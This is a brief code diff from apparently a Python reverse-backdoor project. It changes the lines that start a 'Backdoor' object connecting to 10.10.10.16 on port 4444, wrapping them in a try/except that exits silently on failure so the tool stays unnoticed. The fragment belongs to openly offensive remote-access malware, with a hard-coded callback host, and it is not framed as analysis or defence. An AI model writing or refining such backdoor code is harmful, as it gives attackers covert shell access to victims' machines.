@@ -65,5 +65,8 @@ class Backdoor:
 
 #run to another class
 import reverse_backdoor
-my_backdoor=Backdoor("10.10.10.16", 4444)
-my_backdoor.run()
+try:
+    my_backdoor=Backdoor("10.10.10.16", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
